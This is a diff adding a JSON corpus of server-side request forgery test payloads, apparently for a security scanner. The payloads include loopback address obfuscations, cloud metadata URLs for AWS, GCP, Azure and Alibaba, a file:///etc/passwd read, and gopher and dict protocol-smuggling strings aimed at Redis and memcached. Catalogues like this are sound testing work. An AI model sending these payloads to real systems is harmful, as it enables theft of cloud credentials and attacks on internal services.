@@ -1,0 +1,24 @@
+{
+  "schema": "12-schemas/payload.schema.json",
+  "corpus_id": "PL-WEB-SSRF",
+  "version": "1.0.0",
+  "provenance": { "source": "PAT", "ref": "master@2026-01-15" },
+  "payloads": [
+    { "payload_id": "PL-WEB-SSRF-0001", "cwe_id": "CWE-918", "context": "url", "surface": "parameter", "engine": "none", "payload": "http://127.0.0.1/", "severity": "medium", "tags": ["loopback"], "classification": "T0" },
+    { "payload_id": "PL-WEB-SSRF-0002", "cwe_id": "CWE-918", "context": "url", "surface": "parameter", "engine": "none", "payload": "http://0/", "severity": "medium", "tags": ["loopback", "short-form"], "classification": "T0" },
+    { "payload_id": "PL-WEB-SSRF-0003", "cwe_id": "CWE-918", "context": "url", "surface": "parameter", "engine": "none", "payload": "http://[::1]/", "severity": "medium", "tags": ["loopback", "ipv6"], "classification": "T0" },
+    { "payload_id": "PL-WEB-SSRF-0004", "cwe_id": "CWE-918", "context": "url", "surface": "parameter", "engine": "none", "payload": "http://2130706433/", "severity": "medium", "tags": ["loopback", "decimal"], "classification": "T0" },
+    { "payload_id": "PL-WEB-SSRF-0005", "cwe_id": "CWE-918", "context": "url", "surface": "parameter", "engine": "none", "payload": "http://0x7f.0.0.1/", "severity": "medium", "tags": ["loopback", "hex"], "classification": "T0" },
+    { "payload_id": "PL-WEB-SSRF-0006", "cwe_id": "CWE-918", "context": "url", "surface": "parameter", "engine": "none", "payload": "http://127.1/", "severity": "medium", "tags": ["loopback", "short-form"], "classification": "T0" },
+    { "payload_id": "PL-WEB-SSRF-0010", "cwe_id": "CWE-918", "context": "url", "surface": "parameter", "engine": "aws", "payload": "http://169.254.169.254/latest/meta-data/", "severity": "critical", "tags": ["cloud-metadata", "aws", "imdsv1"], "classification": "T1" },
+    { "payload_id": "PL-WEB-SSRF-0011", "cwe_id": "CWE-918", "context": "url", "surface": "parameter", "engine": "aws", "payload": "http://169.254.169.254/latest/api/token", "severity": "critical", "tags": ["cloud-metadata", "aws", "imdsv2"], "classification": "T1" },
+    { "payload_id": "PL-WEB-SSRF-0012", "cwe_id": "CWE-918", "context": "url", "surface": "parameter", "engine": "gcp", "payload": "http://metadata.google.internal/computeMetadata/v1/?recursive=true", "severity": "critical", "tags": ["cloud-metadata", "gcp"], "classification": "T1" },
+    { "payload_id": "PL-WEB-SSRF-0013", "cwe_id": "CWE-918", "context": "url", "surface": "parameter", "engine": "azure", "payload": "http://169.254.169.254/metadata/instance?api-version=2021-02-01", "severity": "critical", "tags": ["cloud-metadata", "azure"], "classification": "T1" },
+    { "payload_id": "PL-WEB-SSRF-0014", "cwe_id": "CWE-918", "context": "url", "surface": "parameter", "engine": "alibaba", "payload": "http://100.100.100.200/latest/meta-data/", "severity": "critical", "tags": ["cloud-metadata", "alibaba"], "classification": "T1" },
+    { "payload_id": "PL-WEB-SSRF-0020", "cwe_id": "CWE-918", "context": "url", "surface": "parameter", "engine": "none", "payload": "file:///etc/passwd", "severity": "high", "tags": ["local-file"], "classification": "T1" },
+    { "payload_id": "PL-WEB-SSRF-0021", "cwe_id": "CWE-918", "context": "url", "surface": "parameter", "engine": "none", "payload": "gopher://127.0.0.1:6379/_SET%20k%20v", "severity": "critical", "tags": ["protocol-smuggling", "redis-rce"], "classification": "T2" },
+    { "payload_id": "PL-WEB-SSRF-0022", "cwe_id": "CWE-918", "context": "url", "surface": "parameter", "engine": "none", "payload": "dict://127.0.0.1:11211/stats", "severity": "medium", "tags": ["protocol-smuggling", "memcached"], "classification": "T1" },
+    { "payload_id": "PL-WEB-SSRF-0023", "cwe_id": "CWE-918", "context": "url", "surface": "parameter", "engine": "none", "payload": "http://localtest.me/", "severity": "medium", "tags": ["dns-rebinding", "loopback"], "classification": "T0" },
+    { "payload_id": "PL-WEB-SSRF-0024", "cwe_id": "CWE-918", "context": "url", "surface": "parameter", "engine": "none", "payload": "http://169.254.169.254.nip.io/latest/meta-data/", "severity": "critical", "tags": ["cloud-metadata", "hostname"], "classification": "T1" }
+  ]
+}
